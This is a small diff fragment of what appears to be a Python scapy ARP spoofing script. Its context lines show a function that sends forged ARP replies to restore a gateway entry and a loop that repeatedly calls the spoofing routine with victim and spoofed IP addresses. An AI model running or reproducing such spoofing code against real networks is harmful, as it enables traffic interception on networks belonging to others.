@@ -36,6 +36,7 @@ def Reset(tip1,tip2):
     arp_paketi = scapy.ARP(op=2, pdst=tip1,hwdst=macadresi, psrc=tip2,hwsrc=modemmac)
     scapy.send(arp_paketi, verbose=False,count=5)
 
+
 sayac = 0
 while True:
     ArpPaket("192.168.1.100","10.0.2.15")
